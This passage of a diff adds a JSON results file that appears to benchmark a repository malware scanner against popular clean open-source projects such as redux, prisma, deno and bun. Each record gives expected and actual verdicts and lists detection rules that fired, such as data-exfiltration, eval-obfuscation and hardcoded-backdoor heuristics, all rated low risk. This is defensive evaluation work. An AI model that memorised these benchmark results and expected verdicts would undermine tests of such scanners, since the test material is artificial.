+      "falsePositiveNotes": "",
+      "findings": [],
+      "filesScanned": 62,
+      "filesSkipped": 12,
+      "treeTruncated": false,
+      "durationMs": 3599,
+      "error": ""
+    },
+    {
+      "sampleId": "reference-reduxjs-redux",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "Expanded commit-pinned reference corpus",
+      "sourceUrl": "https://github.com/reduxjs/redux",
+      "immutableRef": "5d65348e26635b6ec627b1030732ed38797e88e9",
+      "expectedDetectionCategories": [],
+      "minimumExpectedVerdict": "",
+      "maximumExpectedVerdict": "low",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "low",
+      "actualScore": 0.1875,
+      "safeToClone": true,
+      "rulesTriggered": [
+        "NETWORK_URL_SHORTENER",
+        "DATA_EXFILTRATION"
+      ],
+      "falsePositiveNotes": "",
+      "findings": [
+        {
+          "severity": "medium",
+          "confidence": "high",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "NETWORK_URL_SHORTENER",
+          "file": "examples/counter-ts/src/index.tsx",
+          "line": 22,
+          "description": "Shortened URLs (bit.ly, tinyurl) in source code — obfuscates actual destination"
+        },
+        {
+          "severity": "medium",
+          "confidence": "high",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "NETWORK_URL_SHORTENER",
+          "file": "examples/counter/src/index.js",
+          "line": 22,
+          "description": "Shortened URLs (bit.ly, tinyurl) in source code — obfuscates actual destination"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "DATA_EXFILTRATION",
+          "rule": "DATA_EXFILTRATION",
+          "file": "examples/real-world/src/components/Explore.js",
+          "line": 21,
+          "description": "Data exfiltration patterns detected: Form Data Access"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "DATA_EXFILTRATION",
+          "rule": "DATA_EXFILTRATION",
+          "file": "examples/todos-with-undo/src/containers/AddTodo.js",
+          "line": 13,
+          "description": "Data exfiltration patterns detected: Form Data Access"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "DATA_EXFILTRATION",
+          "rule": "DATA_EXFILTRATION",
+          "file": "examples/todos/src/containers/AddTodo.js",
+          "line": 13,
+          "description": "Data exfiltration patterns detected: Form Data Access"
+        }
+      ],
+      "filesScanned": 200,
+      "filesSkipped": 276,
+      "treeTruncated": false,
+      "durationMs": 6740,
+      "error": ""
+    },
+    {
+      "sampleId": "reference-reduxjs-redux-toolkit",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "Expanded commit-pinned reference corpus",
+      "sourceUrl": "https://github.com/reduxjs/redux-toolkit",
+      "immutableRef": "7b269256424e1d44baf83d7de634d9f53931dda7",
+      "expectedDetectionCategories": [],
+      "minimumExpectedVerdict": "",
+      "maximumExpectedVerdict": "low",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "low",
+      "actualScore": 0,
+      "safeToClone": true,
+      "rulesTriggered": [],
+      "falsePositiveNotes": "",
+      "findings": [],
+      "filesScanned": 200,
+      "filesSkipped": 952,
+      "treeTruncated": false,
+      "durationMs": 3228,
+      "error": ""
+    },
+    {
+      "sampleId": "reference-immerjs-immer",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "Expanded commit-pinned reference corpus",
+      "sourceUrl": "https://github.com/immerjs/immer",
+      "immutableRef": "60ca295e1185db80322ef55ec3fb8475cbc960c7",
+      "expectedDetectionCategories": [],
+      "minimumExpectedVerdict": "",
+      "maximumExpectedVerdict": "low",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "low",
+      "actualScore": 0.15,
+      "safeToClone": true,
+      "rulesTriggered": [
+        "NETWORK_URL_SHORTENER"
+      ],
+      "falsePositiveNotes": "",
+      "findings": [
+        {
+          "severity": "medium",
+          "confidence": "high",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "NETWORK_URL_SHORTENER",
+          "file": "src/utils/errors.ts",
+          "line": 48,
+          "description": "Shortened URLs (bit.ly, tinyurl) in source code — obfuscates actual destination"
+        }
+      ],
+      "filesScanned": 60,
+      "filesSkipped": 105,
+      "treeTruncated": false,
+      "durationMs": 3170,
+      "error": ""
+    },
+    {
+      "sampleId": "reference-date-fns-date-fns",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "Expanded commit-pinned reference corpus",
+      "sourceUrl": "https://github.com/date-fns/date-fns",
+      "immutableRef": "4098115cf705e3af7f663d8e5b0686e39a9f478a",
+      "expectedDetectionCategories": [],
+      "minimumExpectedVerdict": "",
+      "maximumExpectedVerdict": "low",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "low",
+      "actualScore": 0.1275,
+      "safeToClone": true,
+      "rulesTriggered": [
+        "OBF_EVAL",
+        "SUSPICIOUS_FILE_ACCESS"
+      ],
+      "falsePositiveNotes": "",
+      "findings": [
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_EVAL",
+          "file": "pkgs/core/examples/cdn/basic.js",
+          "line": null,
+          "description": "eval() executes arbitrary dynamic code. While there are legitimate uses, eval() is the #1 technique for executing hidden malicious payloads.\n"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_EVAL",
+          "file": "pkgs/core/examples/cdn/fp.js",
+          "line": null,
+          "description": "eval() executes arbitrary dynamic code. While there are legitimate uses, eval() is the #1 technique for executing hidden malicious payloads.\n"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_EVAL",
+          "file": "pkgs/core/examples/cdn/legacy.js",
+          "line": null,
+          "description": "eval() executes arbitrary dynamic code. While there are legitimate uses, eval() is the #1 technique for executing hidden malicious payloads.\n"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_EVAL",
+          "file": "pkgs/core/examples/cdn/legacyStrict.js",
+          "line": null,
+          "description": "eval() executes arbitrary dynamic code. While there are legitimate uses, eval() is the #1 technique for executing hidden malicious payloads.\n"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_EVAL",
+          "file": "pkgs/core/examples/cdn/locale.js",
+          "line": null,
+          "description": "eval() executes arbitrary dynamic code. While there are legitimate uses, eval() is the #1 technique for executing hidden malicious payloads.\n"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_EVAL",
+          "file": "pkgs/core/examples/cdn/locales.js",
+          "line": null,
+          "description": "eval() executes arbitrary dynamic code. While there are legitimate uses, eval() is the #1 technique for executing hidden malicious payloads.\n"
+        },
+        {
+          "severity": "medium",
+          "confidence": "medium",
+          "type": "SUSPICIOUS_FILE_ACCESS",
+          "rule": "SUSPICIOUS_FILE_ACCESS",
+          "file": "pkgs/core/scripts/build/package.sh",
+          "line": 221,
+          "description": "Suspicious file access detected: Destructive File Deletion"
+        }
+      ],
+      "filesScanned": 200,
+      "filesSkipped": 1703,
+      "treeTruncated": false,
+      "durationMs": 3383,
+      "error": ""
+    },
+    {
+      "sampleId": "reference-ramda-ramda",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "Expanded commit-pinned reference corpus",
+      "sourceUrl": "https://github.com/ramda/ramda",
+      "immutableRef": "bcb320e60b5d91c958a6b02feb0bd8658d744298",
+      "expectedDetectionCategories": [],
+      "minimumExpectedVerdict": "",
+      "maximumExpectedVerdict": "low",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "low",
+      "actualScore": 0.09,
+      "safeToClone": true,
+      "rulesTriggered": [
+        "OBFUSCATED_CODE"
+      ],
+      "falsePositiveNotes": "",
+      "findings": [
+        {
+          "severity": "medium",
+          "confidence": "medium",
+          "type": "OBFUSCATED_CODE",
+          "rule": "OBFUSCATED_CODE",
+          "file": "dist/ramda.min.js",
+          "line": 1,
+          "description": "Extremely long line detected (53,748 characters). Contains suspicious code patterns like eval/exec/fetch. Malicious code may be hidden far to the right. Affected: Line 1 (53,748 chars, contains suspicious code)"
+        }
+      ],
+      "filesScanned": 200,
+      "filesSkipped": 513,
+      "treeTruncated": false,
+      "durationMs": 3894,
+      "error": ""
+    },
+    {
+      "sampleId": "reference-sindresorhus-got",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "Expanded commit-pinned reference corpus",
+      "sourceUrl": "https://github.com/sindresorhus/got",
+      "immutableRef": "e3924aa1e53a6ca3eb93a43618ce532442a89b40",
+      "expectedDetectionCategories": [],
+      "minimumExpectedVerdict": "",
+      "maximumExpectedVerdict": "low",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "low",
+      "actualScore": 0,
+      "safeToClone": true,
+      "rulesTriggered": [],
+      "falsePositiveNotes": "",
+      "findings": [],
+      "filesScanned": 87,
+      "filesSkipped": 40,
+      "treeTruncated": false,
+      "durationMs": 2841,
+      "error": ""
+    },
+    {
+      "sampleId": "reference-socketio-socket-io",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "Expanded commit-pinned reference corpus",
+      "sourceUrl": "https://github.com/socketio/socket.io",
+      "immutableRef": "d2d753fed4435015c2d83fe62e676b44e07fa3f7",
+      "expectedDetectionCategories": [],
+      "minimumExpectedVerdict": "",
+      "maximumExpectedVerdict": "low",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "low",
+      "actualScore": 0.27749999999999997,
+      "safeToClone": true,
+      "rulesTriggered": [
+        "NETWORK_URL_SHORTENER",
+        "BACKDOOR_HARDCODED_AUTH",
+        "HARDCODED_SECRETS"
+      ],
+      "falsePositiveNotes": "",
+      "findings": [
+        {
+          "severity": "medium",
+          "confidence": "high",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "NETWORK_URL_SHORTENER",
+          "file": "examples/create-react-app-example/src/index.js",
+          "line": 17,
+          "description": "Shortened URLs (bit.ly, tinyurl) in source code — obfuscates actual destination"
+        },
+        {
+          "severity": "medium",
+          "confidence": "high",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "NETWORK_URL_SHORTENER",
+          "file": "examples/create-react-app-example/src/serviceWorker.js",
+          "line": 11,
+          "description": "Shortened URLs (bit.ly, tinyurl) in source code — obfuscates actual destination"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "BACKDOOR_HARDCODED_AUTH",
+          "file": "examples/passport-example/cjs/index.js",
+          "line": 58,
+          "description": "Hardcoded password check — always-true backdoor condition in auth logic"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "BACKDOOR_HARDCODED_AUTH",
+          "file": "examples/passport-example/esm/index.js",
+          "line": 61,
+          "description": "Hardcoded password check — always-true backdoor condition in auth logic"
+        },
+        {
+          "severity": "medium",
+          "confidence": "medium",
+          "type": "HARDCODED_SECRETS",
+          "rule": "HARDCODED_SECRETS",
+          "file": "examples/basic-crud-application/server-postgres-cluster/lib/index.js",
+          "line": 17,
+          "description": "Hardcoded credentials detected: Password"
+        }
+      ],
+      "filesScanned": 200,
+      "filesSkipped": 655,
+      "treeTruncated": false,
+      "durationMs": 4590,
+      "error": ""
+    },
+    {
+      "sampleId": "reference-apollographql-apollo-client",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "Expanded commit-pinned reference corpus",
+      "sourceUrl": "https://github.com/apollographql/apollo-client",
+      "immutableRef": "c843c98a803d7d7f48f4da72080a61d9086dc8ad",
+      "expectedDetectionCategories": [],
+      "minimumExpectedVerdict": "",
+      "maximumExpectedVerdict": "low",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "low",
+      "actualScore": 0,
+      "safeToClone": true,
+      "rulesTriggered": [],
+      "falsePositiveNotes": "",
+      "findings": [],
+      "filesScanned": 200,
+      "filesSkipped": 853,
+      "treeTruncated": false,
+      "durationMs": 4233,
+      "error": ""
+    },
+    {
+      "sampleId": "reference-tanstack-query",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "Expanded commit-pinned reference corpus",
+      "sourceUrl": "https://github.com/TanStack/query",
+      "immutableRef": "79d2384db5c8776680d5bfbe9b595618c066248b",
+      "expectedDetectionCategories": [],
+      "minimumExpectedVerdict": "",
+      "maximumExpectedVerdict": "low",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "low",
+      "actualScore": 0.15,
+      "safeToClone": true,
+      "rulesTriggered": [
+        "HARDCODED_API_KEY"
+      ],
+      "falsePositiveNotes": "Manual review required; this result is not yet classified as a false positive.",
+      "findings": [
+        {
+          "severity": "high",
+          "confidence": "medium",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "HARDCODED_API_KEY",
+          "file": "examples/react/algolia/src/algolia.ts",
+          "line": 7,
+          "description": "Generic API key / secret key pattern assigned to a variable (obvious placeholders are downgraded by scanner context)"
+        }
+      ],
+      "filesScanned": 200,
+      "filesSkipped": 2151,
+      "treeTruncated": false,
+      "durationMs": 2775,
+      "error": ""
+    },
+    {
+      "sampleId": "reference-testing-library-react-testing-library",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "Expanded commit-pinned reference corpus",
+      "sourceUrl": "https://github.com/testing-library/react-testing-library",
+      "immutableRef": "be9d81d91314c9f0bafaa363f70b409b4b31989c",
+      "expectedDetectionCategories": [],
+      "minimumExpectedVerdict": "",
+      "maximumExpectedVerdict": "low",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "low",
+      "actualScore": 0,
+      "safeToClone": true,
+      "rulesTriggered": [],
+      "falsePositiveNotes": "",
+      "findings": [],
+      "filesScanned": 36,
+      "filesSkipped": 31,
+      "treeTruncated": false,
+      "durationMs": 3410,
+      "error": ""
+    },
+    {
+      "sampleId": "reference-prisma-prisma",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "Expanded commit-pinned reference corpus",
+      "sourceUrl": "https://github.com/prisma/prisma",
+      "immutableRef": "cda80a4488b7b551c36bf09ca2e8303ef9509da4",
+      "expectedDetectionCategories": [],
+      "minimumExpectedVerdict": "",
+      "maximumExpectedVerdict": "low",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "low",
+      "actualScore": 0.27749999999999997,
+      "safeToClone": true,
+      "rulesTriggered": [
+        "TYPOSQUAT_PACKAGE",
+        "OBF_EVAL",
+        "HARDCODED_DB_CONNECTION"
+      ],
+      "falsePositiveNotes": "",
+      "findings": [
+        {
+          "severity": "medium",
+          "confidence": "unspecified",
+          "type": "TYPOSQUAT_PACKAGE",
+          "rule": "TYPOSQUAT_PACKAGE",
+          "file": "package.json",
+          "line": null,
+          "description": "Possible typosquat of \"prettier\": prettier2"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_EVAL",
+          "file": "packages/cli/src/Generate.ts",
+          "line": 36,
+          "description": "eval() executes arbitrary dynamic code. While there are legitimate uses, eval() is the #1 technique for executing hidden malicious payloads.\n"
+        },
+        {
+          "severity": "medium",
+          "confidence": "medium",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "HARDCODED_DB_CONNECTION",
+          "file": "packages/cli/src/Init.ts",
+          "line": 193,
+          "description": "MongoDB or PostgreSQL connection string with credentials embedded"
+        }
+      ],
+      "filesScanned": 200,
+      "filesSkipped": 4471,
+      "treeTruncated": false,
+      "durationMs": 4192,
+      "error": ""
+    },
+    {
+      "sampleId": "reference-tailwindlabs-tailwindcss",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "Expanded commit-pinned reference corpus",
+      "sourceUrl": "https://github.com/tailwindlabs/tailwindcss",
+      "immutableRef": "35a3e9c5159bea77af0d48f0c8849279211cc7e9",
+      "expectedDetectionCategories": [],
+      "minimumExpectedVerdict": "",
+      "maximumExpectedVerdict": "low",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "low",
+      "actualScore": 0,
+      "safeToClone": true,
+      "rulesTriggered": [],
+      "falsePositiveNotes": "",
+      "findings": [],
+      "filesScanned": 200,
+      "filesSkipped": 341,
+      "treeTruncated": false,
+      "durationMs": 3223,
+      "error": ""
+    },
+    {
+      "sampleId": "reference-prettier-prettier",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "Expanded commit-pinned reference corpus",
+      "sourceUrl": "https://github.com/prettier/prettier",
+      "immutableRef": "41a8b99bb8d7d68c00d90d5b8fbaed20511d4cfd",
+      "expectedDetectionCategories": [],
+      "minimumExpectedVerdict": "",
+      "maximumExpectedVerdict": "low",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "low",
+      "actualScore": 0.0375,
+      "safeToClone": true,
+      "rulesTriggered": [
+        "OBF_NEW_FUNCTION"
+      ],
+      "falsePositiveNotes": "",
+      "findings": [
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_NEW_FUNCTION",
+          "file": "bin/prettier.cjs",
+          "line": 16,
+          "description": "new Function() creates and executes dynamic code similar to eval(). Used to hide malicious logic that bypasses some static analysis tools.\n"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_NEW_FUNCTION",
+          "file": "knip.config.js",
+          "line": 17,
+          "description": "new Function() creates and executes dynamic code similar to eval(). Used to hide malicious logic that bypasses some static analysis tools.\n"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_NEW_FUNCTION",
+          "file": "scripts/build/transform/transforms/transform-string-raw.js",
+          "line": 31,
+          "description": "new Function() creates and executes dynamic code similar to eval(). Used to hide malicious logic that bypasses some static analysis tools.\n"
+        }
+      ],
+      "filesScanned": 200,
+      "filesSkipped": 9125,
+      "treeTruncated": false,
+      "durationMs": 3380,
+      "error": ""
+    },
+    {
+      "sampleId": "reference-eslint-eslint",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "Expanded commit-pinned reference corpus",
+      "sourceUrl": "https://github.com/eslint/eslint",
+      "immutableRef": "c5963f74bfa82a5b7ccc0607dcdcc695b8c97a31",
+      "expectedDetectionCategories": [],
+      "minimumExpectedVerdict": "",
+      "maximumExpectedVerdict": "low",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "low",
+      "actualScore": 0.0375,
+      "safeToClone": true,
+      "rulesTriggered": [
+        "DATA_EXFILTRATION"
+      ],
+      "falsePositiveNotes": "",
+      "findings": [
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "DATA_EXFILTRATION",
+          "rule": "DATA_EXFILTRATION",
+          "file": "docs/src/assets/js/search.js",
+          "line": 186,
+          "description": "Data exfiltration patterns detected: Form Data Access"
+        }
+      ],
+      "filesScanned": 200,
+      "filesSkipped": 2156,
+      "treeTruncated": false,
+      "durationMs": 3651,
+      "error": ""
+    },
+    {
+      "sampleId": "reference-pnpm-pnpm",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "Expanded commit-pinned reference corpus",
+      "sourceUrl": "https://github.com/pnpm/pnpm",
+      "immutableRef": "0dd21df7457d2026f411f2c1a09104280b9b16e5",
+      "expectedDetectionCategories": [],
+      "minimumExpectedVerdict": "",
+      "maximumExpectedVerdict": "low",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "low",
+      "actualScore": 0.09,
+      "safeToClone": true,
+      "rulesTriggered": [
+        "HARDCODED_SECRETS"
+      ],
+      "falsePositiveNotes": "",
+      "findings": [
+        {
+          "severity": "medium",
+          "confidence": "medium",
+          "type": "HARDCODED_SECRETS",
+          "rule": "HARDCODED_SECRETS",
+          "file": "pnpm11/auth/commands/src/login.ts",
+          "line": null,
+          "description": "Hardcoded credentials detected: Password"
+        }
+      ],
+      "filesScanned": 200,
+      "filesSkipped": 4869,
+      "treeTruncated": false,
+      "durationMs": 4244,
+      "error": ""
+    },
+    {
+      "sampleId": "noisy-denoland-deno",
+      "corpus": "noisy-legitimate",
+      "label": "reference-clean",
+      "labelSource": "Expanded commit-pinned reference corpus",
+      "sourceUrl": "https://github.com/denoland/deno",
+      "immutableRef": "e5aed78415ded1213794bbf1ebbde1bf5cfa08b4",
+      "expectedDetectionCategories": [],
+      "minimumExpectedVerdict": "",
+      "maximumExpectedVerdict": "low",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "low",
+      "actualScore": 0.2175,
+      "safeToClone": true,
+      "rulesTriggered": [
+        "OBFUSCATED_CODE",
+        "OBF_BASE64_HEAVY",
+        "OBF_EVAL",
+        "HARDCODED_SECRETS",
+        "NETWORK_COMMUNICATION",
+        "CODE_INTEGRITY_ISSUE"
+      ],
+      "falsePositiveNotes": "",
+      "findings": [
+        {
+          "severity": "medium",
+          "confidence": "medium",
+          "type": "OBFUSCATED_CODE",
+          "rule": "OBFUSCATED_CODE",
+          "file": "cli/tools/doc/prism.js",
+          "line": 3,
+          "description": "Extremely long line detected (7,461 characters). Contains suspicious code patterns like eval/exec/fetch. Malicious code may be hidden far to the right. Affected: Line 3 (7,461 chars, contains suspicious code), Line 8 (6,143 chars), Line 10 (5,138 chars, contains suspicious code)"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_BASE64_HEAVY",
+          "file": "cli/tsc/dts/lib.es2020.intl.d.ts",
+          "line": 80,
+          "description": "6+ base64 strings of 50+ chars in a single file. Base64 is a legitimate encoding, but excessive use in source code is a red flag — it's the most common way to hide malicious payloads, C2 URLs, and commands from static analysis.\n"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_EVAL",
+          "file": "cli/tsc/dts/lib.es5.d.ts",
+          "line": 31,
+          "description": "eval() executes arbitrary dynamic code. While there are legitimate uses, eval() is the #1 technique for executing hidden malicious payloads.\n"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_BASE64_HEAVY",
+          "file": "cli/tsc/dts/lib.webworker.d.ts",
+          "line": 1986,
+          "description": "6+ base64 strings of 50+ chars in a single file. Base64 is a legitimate encoding, but excessive use in source code is a red flag — it's the most common way to hide malicious payloads, C2 URLs, and commands from static analysis.\n"
+        },
+        {
+          "severity": "medium",
+          "confidence": "medium",
+          "type": "HARDCODED_SECRETS",
+          "rule": "HARDCODED_SECRETS",
+          "file": ".github/workflows/ci.ts",
+          "line": 758,
+          "description": "Hardcoded credentials detected: Password"
+        },
+        {
+          "severity": "medium",
+          "confidence": "medium",
+          "type": "HARDCODED_SECRETS",
+          "rule": "HARDCODED_SECRETS",
+          "file": ".github/workflows/promote_to_release.ts",
+          "line": 157,
+          "description": "Hardcoded credentials detected: Password"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "NETWORK_COMMUNICATION",
+          "rule": "NETWORK_COMMUNICATION",
+          "file": "cli/tsc/dts/lib.deno.ns.d.ts",
+          "line": 5375,
+          "description": "Suspicious network communication detected: Hardcoded IP Address (3 occurrences)"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "NETWORK_COMMUNICATION",
+          "rule": "NETWORK_COMMUNICATION",
+          "file": "cli/tsc/dts/lib.deno_net.d.ts",
+          "line": 257,
+          "description": "Suspicious network communication detected: Hardcoded IP Address (5 occurrences)"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "CODE_INTEGRITY_ISSUE",
+          "rule": "CODE_INTEGRITY_ISSUE",
+          "file": "cli/tools/doc/prism.js",
+          "line": null,
+          "description": "Minified/obfuscated code detected in source repository"
+        }
+      ],
+      "filesScanned": 200,
+      "filesSkipped": 14300,
+      "treeTruncated": false,
+      "durationMs": 8022,
+      "error": ""
+    },
+    {
+      "sampleId": "noisy-oven-sh-bun",
+      "corpus": "noisy-legitimate",
+      "label": "reference-clean",
+      "labelSource": "Expanded commit-pinned reference corpus",
+      "sourceUrl": "https://github.com/oven-sh/bun",
+      "immutableRef": "8f1a9540fdff25410506de76e0da2506d260c08f",
+      "expectedDetectionCategories": [],
+      "minimumExpectedVerdict": "",
+      "maximumExpectedVerdict": "low",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "low",
+      "actualScore": 0.18,
+      "safeToClone": true,
+      "rulesTriggered": [
+        "OBFUSCATED_CODE",
+        "OBF_EVAL",
+        "HARDCODED_SECRETS",
+        "CODE_INTEGRITY_ISSUE"
+      ],
+      "falsePositiveNotes": "",
+      "findings": [
+        {
+          "severity": "medium",
+          "confidence": "medium",
+          "type": "OBFUSCATED_CODE",
+          "rule": "OBFUSCATED_CODE",
+          "file": "bench/react-hello-world/react-hello-world.workerd.js",
+          "line": 16,
+          "description": "Extremely long line detected (36,141 characters). Contains suspicious code patterns like eval/exec/fetch. Malicious code may be hidden far to the right. Affected: Line 16 (30,001 chars, contains suspicious code), Line 18 (6,437 chars), Line 23 (9,431 chars)"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_EVAL",
+          "file": "bench/snippets/buffer-create.mjs",
+          "line": 17,
+          "description": "eval() executes arbitrary dynamic code. While there are legitimate uses, eval() is the #1 technique for executing hidden malicious payloads.\n"
+        },
+        {
+          "severity": "medium",
+          "confidence": "medium",
+          "type": "HARDCODED_SECRETS",
+          "rule": "HARDCODED_SECRETS",
+          "file": "bench/snippets/pbkdf2.mjs",
+          "line": 5,
+          "description": "Hardcoded credentials detected: Password"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "CODE_INTEGRITY_ISSUE",
+          "rule": "CODE_INTEGRITY_ISSUE",
+          "file": "bench/react-hello-world/react-hello-world.workerd.js",
+          "line": null,
+          "description": "Minified/obfuscated code detected in source repository"
+        }
+      ],
+      "filesScanned": 200,
+      "filesSkipped": 17929,
+      "treeTruncated": false,
+      "durationMs": 5830,
+      "error": ""
+    },
+    {
+      "sampleId": "noisy-tauri-apps-tauri",
+      "corpus": "noisy-legitimate",
+      "label": "reference-clean",
+      "labelSource": "Expanded commit-pinned reference corpus",
+      "sourceUrl": "https://github.com/tauri-apps/tauri",
+      "immutableRef": "f5347cd70838c027040acb4a66733a2470f20ae4",
+      "expectedDetectionCategories": [],
+      "minimumExpectedVerdict": "",
+      "maximumExpectedVerdict": "low",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "low",
+      "actualScore": 0.2175,
+      "safeToClone": true,
+      "rulesTriggered": [
+        "OBFUSCATED_CODE",
+        "SUSPICIOUS_FILE_ACCESS",
+        "HARDCODED_SECRETS"
+      ],
+      "falsePositiveNotes": "",
+      "findings": [
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "OBFUSCATED_CODE",
+          "rule": "OBFUSCATED_CODE",
+          "file": "crates/tauri/scripts/bundle.global.js",
+          "line": 1,
+          "description": "Extremely long line detected (40,694 characters). Malicious code may be hidden far to the right. Affected: Line 1 (40,694 chars)"
+        },
+        {
+          "severity": "medium",
+          "confidence": "medium",
+          "type": "SUSPICIOUS_FILE_ACCESS",
+          "rule": "SUSPICIOUS_FILE_ACCESS",
+          "file": ".docker/cross/cmake.sh",
+          "line": 27,
+          "description": "Suspicious file access detected: Destructive File Deletion"
+        },
+        {
+          "severity": "medium",
+          "confidence": "medium",
+          "type": "SUSPICIOUS_FILE_ACCESS",
+          "rule": "SUSPICIOUS_FILE_ACCESS",
+          "file": ".docker/cross/linux-image.sh",
+          "line": 173,
+          "description": "Suspicious file access detected: Destructive File Deletion"
+        },
+        {
+          "severity": "medium",
+          "confidence": "medium",
+          "type": "HARDCODED_SECRETS",
+          "rule": "HARDCODED_SECRETS",
+          "file": "packages/api/src/core.ts",
+          "line": 241,
+          "description": "Hardcoded credentials detected: Password"
+        }
+      ],
+      "filesScanned": 133,
+      "filesSkipped": 948,
+      "treeTruncated": false,
+      "durationMs": 3181,
+      "error": ""
+    },
+    {
+      "sampleId": "noisy-puppeteer-puppeteer",
+      "corpus": "noisy-legitimate",
+      "label": "reference-clean",
+      "labelSource": "Expanded commit-pinned reference corpus",
+      "sourceUrl": "https://github.com/puppeteer/puppeteer",
+      "immutableRef": "5f5f931a0f2bc64bfb30039c507d763ce044c263",
+      "expectedDetectionCategories": [],
+      "minimumExpectedVerdict": "",
+      "maximumExpectedVerdict": "low",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "low",
+      "actualScore": 0.1275,
+      "safeToClone": true,
+      "rulesTriggered": [
